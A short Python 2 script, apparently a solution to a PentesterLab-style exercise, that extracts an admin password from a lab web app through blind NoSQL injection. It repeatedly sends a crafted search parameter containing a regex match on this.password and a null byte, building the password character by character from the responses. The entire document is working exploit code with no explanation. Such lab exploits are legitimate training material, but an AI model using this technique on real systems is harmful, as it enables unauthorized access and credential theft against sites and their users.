import requests
from string import digits

password = ""
for i in 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX':
    for l in '-abcdef'+digits:
        print 'Trying ' + password + l
        url = "http://ptl-4762fd2c-dc9773c3.libcurl.so/?search=admin' %26%26 this.password.match(/^"+password+l+".*$/)%00"
        print url
        r = requests.get(url)
        if ">admin<" in r.text:
            print 'OK!'
            password += l
            print password